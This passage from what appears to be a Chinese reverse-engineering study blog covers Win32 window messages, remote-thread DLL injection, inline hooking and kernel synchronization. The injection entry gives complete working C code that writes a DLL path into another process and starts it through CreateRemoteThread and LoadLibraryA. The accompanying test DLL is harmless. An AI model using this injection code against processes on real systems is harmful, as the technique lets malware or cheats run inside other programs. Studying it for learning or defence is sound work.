class="literal">NULL</span>,<span class="comment">//父窗口句柄，为NULL  </span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//菜单句柄，为NULL  </span></span><br><span class="line">hInstance,<span class="comment">//当前应用程序的句柄  </span></span><br><span class="line"><span class="literal">NULL</span>);<span class="comment">//附加数据一般为NULL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(hwnd == <span class="literal">NULL</span>)<span class="comment">//是否创建成功  </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤<span class="number">7</span>：显示窗口</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示窗口  </span></span><br><span class="line">ShowWindow(hwnd, SW_SHOW);  </span><br><span class="line"></span><br><span class="line">步骤<span class="number">8</span>：消息循环</span><br><span class="line"></span><br><span class="line">MSG msg;  </span><br><span class="line"><span class="keyword">while</span>(GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))  </span><br><span class="line">&#123;  </span><br><span class="line">TranslateMessage(&amp;msg);  </span><br><span class="line">DispatchMessage(&amp;msg);  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">步骤<span class="number">9</span>：回调函数</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">窗口消息处理程序 窗口回调函数：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1、窗口回调函数处理过的消息，必须传回0.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2、窗口回调不处理的消息，由DefWindowProc来处理.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowProc</span><span class="params">(  </span></span></span><br><span class="line"><span class="function"><span class="params">IN  HWND hwnd,  </span></span></span><br><span class="line"><span class="function"><span class="params">IN  UINT uMsg,  </span></span></span><br><span class="line"><span class="function"><span class="params">IN  WPARAM wParam,  </span></span></span><br><span class="line"><span class="function"><span class="params">IN  LPARAM lParam  </span></span></span><br><span class="line"><span class="function"><span class="params">)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="keyword">switch</span>(uMsg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//窗口消息</span></span><br><span class="line"><span class="keyword">case</span> WM_CREATE: </span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_CREATE %d %d\n"</span>,wParam,lParam);</span><br><span class="line">CREATESTRUCT* createst = (CREATESTRUCT*)lParam;</span><br><span class="line">DbgPrintf(<span class="string">"CREATESTRUCT %s\n"</span>,createst-&gt;lpszClass);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_MOVE:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_MOVE %d %d\n"</span>,wParam,lParam);</span><br><span class="line">POINTS points = MAKEPOINTS(lParam);</span><br><span class="line">DbgPrintf(<span class="string">"X Y %d %d\n"</span>,points.x,points.y);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_SIZE %d %d\n"</span>,wParam,lParam);</span><br><span class="line"><span class="keyword">int</span> newWidth  = (<span class="keyword">int</span>)(<span class="keyword">short</span>) LOWORD(lParam);    </span><br><span class="line"><span class="keyword">int</span> newHeight  = (<span class="keyword">int</span>)(<span class="keyword">short</span>) HIWORD(lParam);   </span><br><span class="line">DbgPrintf(<span class="string">"WM_SIZE %d %d\n"</span>,newWidth,newHeight);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_DESTROY %d %d\n"</span>,wParam,lParam);</span><br><span class="line">PostQuitMessage(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//键盘消息</span></span><br><span class="line"><span class="keyword">case</span> WM_KEYUP:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_KEYUP %d %d\n"</span>,wParam,lParam);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> WM_KEYDOWN:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_KEYDOWN %d %d\n"</span>,wParam,lParam);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//鼠标消息</span></span><br><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">&#123;</span><br><span class="line">DbgPrintf(<span class="string">"WM_LBUTTONDOWN %d %d\n"</span>,wParam,lParam);</span><br><span class="line">POINTS points = MAKEPOINTS(lParam);</span><br><span class="line">DbgPrintf(<span class="string">"WM_LBUTTONDOWN %d %d\n"</span>,points.x,points.y);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> DefWindowProc(hwnd,uMsg,wParam,lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下面是视频的关于消息的PPT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Windows中的事件是一个“动作”，这个动作可能是用户操作应用程序产生的，也可能是Windows自己产生的.</span><br><span class="line"></span><br><span class="line">而消息，就是用来描述这些“动作”的，比如：</span><br><span class="line"></span><br><span class="line">这个动作是什么时候产生的？</span><br><span class="line"></span><br><span class="line">哪个应用程序产生的？</span><br><span class="line"></span><br><span class="line">在什么位置产生的？</span><br><span class="line"></span><br><span class="line">等等。。。</span><br><span class="line"></span><br><span class="line">Windows为了能够准确的描述这些信息，提供了一个结构体：MSG，该结构体里面记录的事件的详细信息.</span><br><span class="line"></span><br><span class="line">typedef struct tagMSG &#123;</span><br><span class="line">  HWND   hwnd; </span><br><span class="line">  UINT   message; </span><br><span class="line">  WPARAM wParam; </span><br><span class="line">  LPARAM lParam; </span><br><span class="line">  DWORD  time; </span><br><span class="line">  POINT  pt; </span><br><span class="line">&#125; MSG, *PMSG; </span><br><span class="line"></span><br><span class="line">说明：</span><br><span class="line"></span><br><span class="line">1、hwnd：</span><br><span class="line"></span><br><span class="line">表示消息所属的窗口</span><br><span class="line"></span><br><span class="line">一个消息一般都是与某个窗口相关联的</span><br><span class="line"></span><br><span class="line">在Windows中 HWND类型的变量通常用来标识窗口。</span><br><span class="line"></span><br><span class="line">2、message</span><br><span class="line"></span><br><span class="line">在Windows中，消息是由一个数值来表示的</span><br><span class="line"></span><br><span class="line">但是由于数值不便于记忆，所以Windows将消息对应的数值定义为WM_XXX宏（WM == Window Message）</span><br><span class="line"></span><br><span class="line">鼠标左键按下 WM_LBUTTONDOWN键盘按下 WM_KEYDOWN</span><br><span class="line"></span><br><span class="line">3、wParam 和 lParam</span><br><span class="line"></span><br><span class="line">32位消息的特定附加信息,具体表示什么处决于message </span><br><span class="line"></span><br><span class="line">4、time</span><br><span class="line"></span><br><span class="line">消息创建时的时间 </span><br><span class="line"></span><br><span class="line">5、消息创建时的鼠标位置</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1]. 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - WIN32编程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WIN32 </tag>
            
            <tag> WIN32编程 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>远程线程注入</title>
      <link href="/2018/07/05/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
      <url>/2018/07/05/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>把自己的要执行代码写入个Dll，注入进去。   </p><h2 id="什么是注入"><a href="#什么是注入" class="headerlink" title="什么是注入"></a>什么是注入</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/16.png" alt="16"></p><h2 id="远程线程注入流程"><a href="#远程线程注入流程" class="headerlink" title="远程线程注入流程"></a>远程线程注入流程</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/17.png" alt="17"></p><p>思路就是写一个dll，然后再里面创建一个线程，然后执行你想做的操作，注入程序按照流程，先获取对方进程ID，将在目标进程申请一块内存，写入Dll名字，然后获取kernel32的句柄，用于找到LoadLibraryA（因为Kernel32是内核模块的，同个计算机系统每个进程这个地址一样），找到LoadLibraryA之后把这个函数的地址放入创建远程线程函数在远程进程的地址空间中,该线程的线程函数的起始地址.的参数里，参数就是之前我们申请的放入Dll的地址。<br>然后我们可以在运行时调试，通过OD观察远程进程内存是否写入我们的dll路径，以及是否创建成功远程线程，如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/19.png" alt="18"></p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/18.png?x-oss-process=style/yangruiqi.com" alt="19"></p><p>具体代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 远程线程注入.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">LoadDll</span><span class="params">(DWORD dwProcessID, <span class="keyword">char</span> *szDllPathName)</span> </span>&#123;<span class="comment">//第一个参数进程ID，加载dll的完整路径</span></span><br><span class="line">BOOL bRet;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwLength;</span><br><span class="line">DWORD dwLoadAddr;</span><br><span class="line">LPVOID lpAllocAddr;</span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">HMODULE hModule;</span><br><span class="line">bRet = <span class="number">0</span>;</span><br><span class="line">dwLoadAddr = <span class="number">0</span>;</span><br><span class="line">hProcess = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1.获取进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"OpenProcess Error!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2. 计算DLL路径名字长度，并且要加上0结尾的长度</span></span><br><span class="line">dwLength = <span class="built_in">strlen</span>(szDllPathName) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//3. 在目标进程分配内存</span></span><br><span class="line">lpAllocAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpAllocAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"VirtualAllocEx Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4.拷贝DLL路径名字到目标进程的内存</span></span><br><span class="line">bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, dwLength, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!bRet) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"WriteProcessMemory Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//5.因为Kernel32，大家都有，所以从自己进程这获取就行，所以这步是火区模块地址</span></span><br><span class="line">hModule = GetModuleHandle(<span class="string">L"kernel32.dll"</span>);</span><br><span class="line"><span class="keyword">if</span> (!hModule) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"GetModuleHandle Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//6.获取LoadLibraryA函数地址</span></span><br><span class="line">dwLoadAddr = (DWORD)GetProcAddress(hModule, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line"><span class="keyword">if</span> (!dwLoadAddr) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"GetProcAddress Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//7. 创建远程线程，加载Dll</span></span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>,<span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!hThread) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"CreateRemoteThread Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hModule);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8.关闭句柄</span></span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyCreateRemoteThread</span><span class="params">(DWORD dwProcessID, DWORD dwProcAddr)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hThread;</span><br><span class="line">DWORD dwThreadID;</span><br><span class="line">hProcess = <span class="number">0</span>;</span><br><span class="line">dwThreadID = <span class="number">0</span>;</span><br><span class="line">hThread = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//1.获取进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"OpenProcess Error!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.创建远程线程</span></span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)dwProcAddr, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwThreadID);</span><br><span class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == hThread) &#123;</span><br><span class="line">OutputDebugString(<span class="string">L"CreateRemoteThread Error!\n"</span>);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3.关闭</span></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LoadDll(<span class="number">16588</span>, <span class="string">"D:\\yangruiqiDll.dll"</span>);<span class="comment">//第一个参数是要注入dll的进程，第二个是dll目录</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试的Dll如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"注入的代码在执行\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频</p>]]></content>
      
      <categories>
          
          <category> 笔记 - 注入笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 注入 </tag>
            
            <tag> 远程线程注入 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Inline_Hook</title>
      <link href="/2018/07/02/Inline-Hook/"/>
      <url>/2018/07/02/Inline-Hook/</url>
      <content type="html"><![CDATA[<h1 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h1><p>jmp 到没用的地方<br>pushad,pushfd,<br>做自己的事<br>popfd,popad.<br>加上被覆盖的代码<br>jmp 到被覆盖代码的下一行   </p><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>位置的选择：</p><p><1> JMP/CALL指令至少占用5个字节</1></p><p><2> 绕开全局变量，因为全局变量的硬编码会随着指令变</2></p><p><3> 根据业务来决定在哪里HOOK：过滤参数？修改返回结果？</3></p><p>inline hook本质是改硬编码，改成<br>E9 +Code<br>Code = 要跳转的地址 - 补丁地址 - 5</p><p>比如从4183D7调到418221code就是285，采用小端存储就是<br>85 02 00 00</p>]]></content>
      
      <categories>
          
          <category> 笔记 - Hook笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Inline—Hook </tag>
            
            <tag> 内核学习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>驱动学习笔记下</title>
      <link href="/2018/07/02/%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/"/>
      <url>/2018/07/02/%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%8B/</url>
      <content type="html"><![CDATA[<h1 id="多核同步之临界区"><a href="#多核同步之临界区" class="headerlink" title="多核同步之临界区"></a>多核同步之临界区</h1><p>并发是指多个线程在同时执行：<br>单核（是分时执行，不是真正的同时）<br>多核（在某一个时刻，会同时有多个线程再执行） </p><p>同步则是保证在并发执行的环境中各个线程可以有序的执行       </p><h4 id="演示代码"><a href="#演示代码" class="headerlink" title="演示代码"></a>演示代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DWORD  dwVal = 0;//全局变量</span><br><span class="line"></span><br><span class="line">线程中的代码：</span><br><span class="line"></span><br><span class="line">dwVal ++;//只有一行  安全吗?</span><br><span class="line"></span><br><span class="line">对应的汇编代码：</span><br><span class="line"></span><br><span class="line">moveax,[0x12345678]</span><br><span class="line">addeax,1</span><br><span class="line">mov[0x12345678],eax</span><br></pre></td></tr></table></figure><h2 id="LOCK指令"><a href="#LOCK指令" class="headerlink" title="LOCK指令"></a>LOCK指令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">INC DWORD PTR DS:[0x12345678]//一行汇编代码，安全吗?</span><br><span class="line"></span><br><span class="line">改成</span><br><span class="line"></span><br><span class="line">LOCK INC DWORD PTR DS:[0x12345678]//Lock锁的不是cpu，是内存，只能锁一行   </span><br><span class="line"></span><br><span class="line">参考：kernel32.InterlockedIncrement</span><br><span class="line"></span><br><span class="line">原子操作相关的API：</span><br><span class="line">InterlockedIncrementInterlockedExchangeAdd</span><br><span class="line">InterlockedDecrementInterlockedFlushSList</span><br><span class="line">InterlockedExchangeInterlockedPopEntrySList</span><br><span class="line">InterlockedCompareExchangeInterlockedPushEntrySList</span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>如何保证多行的单核操作<br>使用临界区来完成   </p><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h2><p>一次只允许一个线程进入直到离开<br>关键点：进入临界区，离开临界区。比如用标志。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwFlag = 0;//实现临界区的方式就是加锁</span><br><span class="line">//锁：全局变量  进去加一 出去减一</span><br><span class="line"></span><br><span class="line">if(dwFlag  == 0)//进入临界区</span><br><span class="line">&#123;</span><br><span class="line">dwFlag   = 1</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">dwFlag   = 0//离开临界区</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但是同时进入临界区的话，比如1进入还没改标志，2进入了，会出问题。<br>解决这个问题。   </p><h2 id="自己实现临界区"><a href="#自己实现临界区" class="headerlink" title="自己实现临界区"></a>自己实现临界区</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">全局变量：Flag = 0</span><br><span class="line"></span><br><span class="line">进入临界区：</span><br><span class="line">Lab：</span><br><span class="line">mov eax,1</span><br><span class="line">lock xadd [Flag],eax//先加一，这个lock防止2个核同时执行这个代码   </span><br><span class="line">cmp eax,0//后判断之前是不是0，即之前没有人进来</span><br><span class="line">jz endLab</span><br><span class="line">dec [Flag]</span><br><span class="line">//线程等待Sleep..，因为一Sleep，线程就切换了</span><br><span class="line">endLab:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">离开临界区：</span><br><span class="line"></span><br><span class="line">lock dec [Flag]</span><br><span class="line"></span><br><span class="line">A()</span><br><span class="line">..</span><br><span class="line">..</span><br><span class="line">..</span><br><span class="line">..</span><br><span class="line">B()</span><br></pre></td></tr></table></figure><h1 id="多核同步之自旋锁"><a href="#多核同步之自旋锁" class="headerlink" title="多核同步之自旋锁"></a>多核同步之自旋锁</h1><p>不同版本的内核文件</p><p>单核：</p><pre><code>ntkrnlpa.exe    2-9-9-12分页ntoskrnl.exe    10-10-12分页</code></pre><p>多核：</p><pre><code>ntkrnlpa.exe    2-9-9-12分页ntoskrnl.exe    10-10-12分页</code></pre><h2 id="Windows自旋锁"><a href="#Windows自旋锁" class="headerlink" 